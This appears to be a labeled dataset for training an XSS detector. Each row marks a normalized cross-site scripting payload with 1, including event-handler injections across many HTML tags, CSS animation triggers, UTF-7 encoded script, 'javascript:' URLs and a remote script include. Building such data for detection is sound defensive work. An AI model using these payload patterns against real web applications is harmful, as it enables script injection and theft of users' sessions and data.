1,"< object OreVar = OreDef ( 1 ) "" contenteditable > test < /object >"
1,"< style > :target {color: red ; } < /style > < html OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /html >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < dt OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /dt >"
1,"< var OreVar = OreDef ( 1 ) "" contenteditable > test < /var >"
1,"< style > @keyframes x{} < /style > < sup OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /sup >"
1,"< html OreVar = OreDef ( 1 ) "" contenteditable > test < /html >"
1,< frameset > < frame OreVar = OreDef ( 1 ) >
1,"< kbd OreVar = OreDef ( 1 ) "" > test < /kbd >"
1,"< dir OreVar = OreDef ( 1 ) "" > test < /dir >"
1,"< style > @keyframes slidein {} < /style > < xmp OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /xmp >"
1,< dfn OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /dfn >
1,"< HEAD > < META OreVar = ""CONTENT-TYPE"" OreVar = ""text/html ; OreVar = UTF-7"" > < /HEAD > +ADw-SCRIPT+AD4-alert ( OreVar ) ; +ADw-/SCRIPT+AD4-"
1,"< style > :target {color: red ; } < /style > < ruby OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /ruby >"
1,"< style > @keyframes slidein {} < /style > < nextid OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /nextid >"
1,"< q OreVar = OreDef ( 1 ) "" > test < /q >"
1,< bgsound OreVar = OreDef ( 1 ) > XSS < /bgsound >
1,< frameset OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /frameset > < input OreVar = y autofocus >
1,"< ol OreVar = OreDef ( 1 ) "" contenteditable > test < /ol >"
1,< fieldset OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /fieldset >
1,"< a OreVar = OreDef ( 1 ) "" contenteditable > test < /a >"
1,"< image OreVar = OreDef ( 1 ) "" contenteditable > test < /image >"
1,< base OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /base >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < label OreVar = OreDef ( 1 ) contenteditable > drop here < /label >"
1,"< dir OreVar = OreDef ( 1 ) "" contenteditable > test < /dir >"
1,"< form OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /form >"
1,< dl OreVar = OreDef ( 1 ) > XSS < /dl >
1,"< dialog OreVar = OreDef ( 1 ) "" > test < /dialog >"
1,< data OreVar = OreDef ( 1 ) > XSS < /data >
1,"< blink OreVar = OreDef ( 1 ) "" contenteditable > test < /blink >"
1,"< frame OreVar = OreDef ( 1 ) "" > test < /frame >"
1,"< style > :target {color:red ; } < /style > < a OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /a >"
1,"< select OreVar = OreDef ( 1 ) "" contenteditable > test < /select >"
1,< th OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /th > < input autofocus >
1,"< ol OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /ol >"
1,"< tbody OreVar = OreDef ( 1 ) "" contenteditable > test < /tbody >"
1,< discard OreVar = OreDef ( 1 ) > XSS < /discard >
1,< big OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /big >
1,"OreVar = < data:text/html ; base64 , OreVar ="
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < bgsound OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /bgsound >"
1,"< style > :target {color:red ; } < /style > < mark OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /mark >"
1,"< th OreVar = OreDef ( 1 ) "" contenteditable > test < /th >"
1,< li OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /li > < input OreVar = y autofocus >
1,"OreVar = ""test.xml"" OreVar = I"
1,< summary OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /summary > < input autofocus >
1,"< image OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /image >"
1,"< small OreVar = OreDef ( 1 ) "" contenteditable > test < /small >"
1,"< style > @keyframes x{} < /style > < keygen OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /keygen >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < menu OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /menu >"
1,"< legend OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /legend >"
1,"< header OreVar = OreDef ( 1 ) "" > test < /header >"
1,< dir OreVar = OreDef ( 1 ) > XSS < /dir >
1,< p OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /p >
1,< code OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /code > < input autofocus >
1,"< figure OreVar = OreDef ( 1 ) "" contenteditable > test < /figure >"
1,"< noscript OreVar = OreDef ( 1 ) "" > test < /noscript >"
1,< a OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /a > < input autofocus >
1,< optgroup OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /optgroup > < input OreVar = y autofocus >
1,"< canvas OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /canvas >"
1,"< canvas OreVar = OreDef ( 1 ) "" contenteditable > test < /canvas >"
1,< option OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /option >
1,< image OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /image >
1,"< body OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /body >"
1,< li OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /li >
1,< picture OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /picture > < input autofocus >
1,"< dfn OreVar = OreDef ( 1 ) "" > test < /dfn >"
1,"< style > @keyframes x{} < /style > < script OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /script >"
1,< aside OreVar = OreDef ( 1 ) > XSS < /aside >
1,url ( OreVar ( OreVar )
1,< aside OreVar = OreDef ( 1 ) > XSS < /aside >
1,"< blink OreVar = OreDef ( 1 ) "" > test < /blink >"
1,< form OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /form > < input OreVar = y autofocus >
1,"< canvas OreVar = OreDef ( 1 ) "" > test < /canvas >"
1,< svg > < xss OreVar = OreDef ( 1 ) > < /xss >
1,"< keygen OreVar = OreDef ( 1 ) "" > test < /keygen >"
1,"< sup OreVar = OreDef ( 1 ) "" > test < /sup >"
1,< rt OreVar = OreDef ( 1 ) > XSS < /rt >
1,"< area OreVar = OreDef ( 1 ) "" contenteditable > test < /area >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < xss OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /xss >"
1,< strong OreVar = OreDef ( 1 ) > XSS < /strong >
1,"< q OreVar = OreDef ( 1 ) "" contenteditable > test < /q >"
1,"< aside OreVar = OreDef ( 1 ) "" contenteditable > test < /aside >"
1,"< applet OreVar = OreDef ( 1 ) "" > test < /applet >"
1,"< big OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /big >"
1,"< aside OreVar = OreDef ( 1 ) "" > test < /aside >"
1,"< style > @keyframes x{} < /style > < template OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /template >"
1,"< embed OreVar = OreDef ( 1 ) "" > test < /embed >"
1,"< del OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /del >"
1,"< style > :target {color: red ; } < /style > < element OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /element >"
1,"< div OreVar = OreDef ( 1 ) "" > test < /div >"
1,< main OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /main >
1,< caption OreVar = OreDef ( 1 ) > XSS < /caption >
1,"< spacer OreVar = OreDef ( 1 ) "" contenteditable > test < /spacer >"
1,"< element OreVar = OreDef ( 1 ) "" contenteditable > test < /element >"
1,< figcaption OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /figcaption > < input OreVar = y autofocus >
1,"< mark OreVar = OreDef ( 1 ) "" > test < /mark >"
1,< menuitem OreVar = OreDef ( 1 ) > XSS < /menuitem >
1,"< kbd OreVar = OreDef ( 1 ) "" > test < /kbd >"
1,< div OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /div > < input OreVar = y autofocus >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < map OreVar = OreDef ( 1 ) contenteditable > drop here < /map >"
1,"< multicol OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /multicol >"
1,"< samp OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /samp >"
1,"< style > @keyframes slidein {} < /style > < progress OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /progress >"
1,< audio OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /audio > < input autofocus >
1,"< noembed OreVar = OreDef ( 1 ) "" contenteditable > test < /noembed >"
1,document.getElementsByClassName ( OreVar ) .length
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < col OreVar = OreDef ( 1 ) contenteditable > drop here < /col >"
1,"< hr OreVar = OreDef ( 1 ) "" contenteditable > test < /hr >"
1,< body OreVar = OreDef ( 1 ) > XSS < /body >
1,"< listing OreVar = OreDef ( 1 ) "" > test < /listing >"
1,"< head OreVar = OreDef ( 1 ) "" contenteditable > test < /head >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < kbd OreVar = OreDef ( 1 ) contenteditable > drop here < /kbd >"
1,"< output OreVar = OreDef ( 1 ) "" > test < /output >"
1,"< footer OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /footer >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < b OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /b >"
1,"< menuitem OreVar = OreDef ( 1 ) "" > test < /menuitem >"
1,"< multicol OreVar = OreDef ( 1 ) "" contenteditable > test < /multicol >"
1,< figcaption OreVar = OreDef ( 1 ) > XSS < /figcaption >
1,"< applet OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /applet >"
1,< label OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /label >
1,"< aside OreVar = OreDef ( 1 ) "" contenteditable > test < /aside >"
1,"< link OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /link >"
1,"< multicol OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /multicol >"
1,"< hgroup OreVar = OreDef ( 1 ) "" > test < /hgroup >"
1,"< !--#exec OreVar = ""/bin/echo 'IPT OreVar = http://.rocks/.js >"
1,:ex/**//*/*/pression ( OreVar ( OreVar ) ) ' >
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < option OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /option >"
1,"< canvas OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /canvas >"
1,"< p OreVar = OreDef ( 1 ) "" > test < /p >"
1,"< fieldset OreVar = OreDef ( 1 ) "" > test < /fieldset >"
1,< wbr OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /wbr >
1,"< basefont OreVar = OreDef ( 1 ) "" > test < /basefont >"
1,"< style > :target {color:red ; } < /style > < optgroup OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /optgroup >"
1,"< small OreVar = OreDef ( 1 ) "" contenteditable > test < /small >"
1,"< label OreVar = OreDef ( 1 ) "" contenteditable > test < /label >"
1,"< object OreVar = OreDef ( 1 ) "" contenteditable > test < /object >"
1,"< noembed OreVar = OreDef ( 1 ) "" contenteditable > test < /noembed >"
1,< samp OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /samp >
1,"< style > @keyframes x{} < /style > < menuitem OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /menuitem >"
1,"< dfn OreVar = OreDef ( 1 ) "" > test < /dfn >"
1,< th OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /th > < input autofocus >
1,< b OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /b >
1,"< multicol OreVar = OreDef ( 1 ) "" contenteditable > test < /multicol >"
1,"< sub OreVar = OreDef ( 1 ) "" > test < /sub >"
1,< h1 OreVar = OreDef ( 1 ) > XSS < /h1 >
1,"< hr OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /hr >"
1,"< IMG OreVar = ""jav ascript:alert ( OreVar ) ; "" >"
1,"< bgsound OreVar = OreDef ( 1 ) "" contenteditable > test < /bgsound >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < bdi OreVar = OreDef ( 1 ) contenteditable > drop here < /bdi >"
1,"< figcaption OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /figcaption >"
1,"< main OreVar = OreDef ( 1 ) "" > test < /main >"
1,"< mark OreVar = OreDef ( 1 ) "" contenteditable > test < /mark >"
1,"< figcaption OreVar = OreDef ( 1 ) "" > test < /figcaption >"
1,< svg > < element OreVar = OreDef ( 1 ) > < /element >
1,"< SCRIPT/ OreVar = ""http://.rocks/.js"" > < /SCRIPT >"
1,"< thead OreVar = OreDef ( 1 ) "" contenteditable > test < /thead >"
1,"< legend OreVar = OreDef ( 1 ) "" contenteditable > test < /legend >"
1,< wbr OreVar = OreDef ( 1 ) > XSS < /wbr >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < canvas OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /canvas >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < sub OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /sub >"
1,< legend OreVar = OreDef ( 1 ) > XSS < /legend >
1,< strike OreVar = OreDef ( 1 ) > XSS < /strike >
1,"< tfoot OreVar = OreDef ( 1 ) "" > test < /tfoot >"
1,"< frameset OreVar = OreDef ( 1 ) "" > test < /frameset >"
1,< menu OreVar = OreDef ( 1 ) > XSS < /menu >
1,"< abbr OreVar = OreDef ( 1 ) "" > test < /abbr >"
1,"< nextid OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /nextid >"
1,< td OreVar = OreDef ( 1 ) > XSS < /td >
1,< a OreVar = OreDef ( 1 ) > XSS < /a >
1,"< nav OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /nav >"
1,< input OreVar = radio OreVar = x OreVar = OreDef ( 1 ) >
1,< html OreVar = OreDef ( 1 ) > XSS < /html >
1,< body OreVar = OreDef ( 1 ) >
1,< map OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /map > < input OreVar = y autofocus >
1,"< style > @keyframes x{} < /style > < cite OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /cite >"
1,"< span OreVar = OreDef ( 1 ) "" > test < /span >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < applet OreVar = OreDef ( 1 ) contenteditable > drop here < /applet >"
1,< big OreVar = OreDef ( 1 ) > XSS < /big >
1,"< menu OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /menu >"
1,"< span OreVar = OreDef ( 1 ) "" contenteditable > test < /span >"
1,"< style > :target {color:red ; } < /style > < i OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /i >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < acronym OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /acronym >"
1,"< legend OreVar = OreDef ( 1 ) "" contenteditable > test < /legend >"
1,"< big OreVar = OreDef ( 1 ) "" > test < /big >"
1,< font OreVar = OreDef ( 1 ) > XSS < /font >
1,< set OreVar = OreDef ( 1 ) > XSS < /set >
1,< tt OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /tt > < input autofocus >
1,< dl OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /dl >
1,"< object OreVar = OreDef ( 1 ) "" > test < /object >"
1,"< object OreVar = OreDef ( 1 ) "" > test < /object >"
1,"< style > :target {color: red ; } < /style > < data OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /data >"
1,< hgroup OreVar = OreDef ( 1 ) > XSS < /hgroup >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < pre OreVar = OreDef ( 1 ) contenteditable > drop here < /pre >"
1,"< colgroup OreVar = OreDef ( 1 ) "" > test < /colgroup >"
1,< div OreVar = OreDef ( 1 ) > XSS < /div >
1,< strike OreVar = OreDef ( 1 ) > XSS < /strike >
1,"< embed OreVar = OreDef ( 1 ) "" > test < /embed >"
1,"< style > @keyframes x{} < /style > < section OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /section >"
1,"< element OreVar = OreDef ( 1 ) "" > test < /element >"
1,< cite OreVar = OreDef ( 1 ) > XSS < /cite >
1,"< nav OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /nav >"
1,"< keygen OreVar = OreDef ( 1 ) "" contenteditable > test < /keygen >"
1,< button OreVar = OreDef ( 1 ) > XSS < /button >
1,"< s OreVar = OreDef ( 1 ) "" contenteditable > test < /s >"
1,< svg > < em OreVar = OreDef ( 1 ) > < /em >
1,< svg > < animate OreVar = OreDef ( 1 ) OreVar = x OreVar = 1s >
1,"< small OreVar = OreDef ( 1 ) "" contenteditable > test < /small >"
1,"< element OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /element >"
1,"< style > :target {color: red ; } < /style > < ol OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /ol >"
1,"< style OreVar = OreDef ( 1 ) "" > test < /style >"
1,"< video OreVar = OreDef ( 1 ) "" contenteditable > test < /video >"
1,< blockquote OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /blockquote >
1,"< q OreVar = OreDef ( 1 ) "" contenteditable > test < /q >"
1,< tt OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /tt > < input OreVar = y autofocus >
1,document.write
1,< embed OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /embed >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < nobr OreVar = OreDef ( 1 ) contenteditable > drop here < /nobr >"
1,< listing OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /listing >
1,"< article OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /article >"
1,< span OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /span > < input autofocus >
1,"< strong OreVar = OreDef ( 1 ) "" > test < /strong >"
1,"< dt OreVar = OreDef ( 1 ) "" contenteditable > test < /dt >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < nav OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /nav >"
1,< svg > < thead OreVar = OreDef ( 1 ) > < /thead >
1,"< tbody OreVar = OreDef ( 1 ) "" > test < /tbody >"
1,"< IMG OreVar = ""` < javascript:alert > ` ( OreVar ) """
1,"< source OreVar = OreDef ( 1 ) "" > test < /source >"
1,"< command OreVar = OreDef ( 1 ) "" > test < /command >"
1,"< li OreVar = OreDef ( 1 ) "" > test < /li >"
1,< wbr OreVar = OreDef ( 1 ) > XSS < /wbr >
1,"< br OreVar = OreDef ( 1 ) "" > test < /br >"
1,"< style > :target {color: red ; } < /style > < body OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /body >"
1,"< link OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /link >"
1,"< template OreVar = OreDef ( 1 ) "" contenteditable > test < /template >"
1,< iframe OreVar = OreDef ( 1 ) > XSS < /iframe >
1,"< label OreVar = OreDef ( 1 ) "" > test < /label >"
1,"< pre OreVar = OreDef ( 1 ) "" contenteditable > test < /pre >"
1,"< head OreVar = OreDef ( 1 ) "" > test < /head >"
1,< nobr OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /nobr >
1,"< label OreVar = OreDef ( 1 ) "" > test < /label >"
1,< source OreVar = OreDef ( 1 ) > XSS < /source >
1,"< big OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /big >"
1,"< optgroup OreVar = OreDef ( 1 ) "" > test < /optgroup >"
1,"< style > @keyframes x{} < /style > < u OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /u >"
1,"< style > :target {color:red ; } < /style > < body OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /body >"
1,< a OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /a >
1,< applet OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /applet > < input OreVar = y autofocus >
1,"< code OreVar = OreDef ( 1 ) "" contenteditable > test < /code >"
1,< big OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /big > < input autofocus >
1,"< strong OreVar = OreDef ( 1 ) "" contenteditable > test < /strong >"
1,< cite OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /cite >
1,"< i OreVar = OreDef ( 1 ) "" > test < /i >"
1,< command OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /command > < input autofocus >
1,"< pre OreVar = OreDef ( 1 ) "" contenteditable > test < /pre >"
1,< slot OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /slot >
1,"< style > @keyframes x{} < /style > < base OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /base >"
1,OreVar = OreDef ( '' )
1,"< slot OreVar = OreDef ( 1 ) "" contenteditable > test < /slot >"
